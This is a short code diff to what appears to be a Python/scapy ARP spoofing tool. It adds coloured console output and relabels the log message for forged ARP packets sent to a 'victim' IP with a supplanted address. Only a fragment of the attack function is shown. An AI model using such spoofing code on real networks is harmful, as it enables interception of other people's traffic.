@@ -6,6 +6,7 @@ from scapy.all import *
 import time
 import lib.log as liblog
 import lib.get_debug as lgd
+from termcolor import colored
 
 # *****************************************************************************************************
 # *****************************************************************************************************
@@ -18,9 +19,10 @@ def create_ARP_request_gratuituous(victim_ip,victim_mac,supplanted_ip,original_m
         	hwsrc=original_mac,
         	pdst=victim_ip,
 			hwdst=victim_mac)
-	send(arp,iface=original_iface)
+	send(arp,iface=original_iface,verbose=0)
+	print(colored("[*] ARP SPOOFING SENT TO " + victim_ip,"blue"))
 	if lgd.get_dbg()[1]:
-		liblog.write_in_file("GRATUITIOUS ARP SENT TO " + victim_ip)
+		liblog.write_in_file("ARP SPOOFING SENT TO " + victim_ip)
 
 # *****************************************************************************************************
 # *****************************************************************************************************
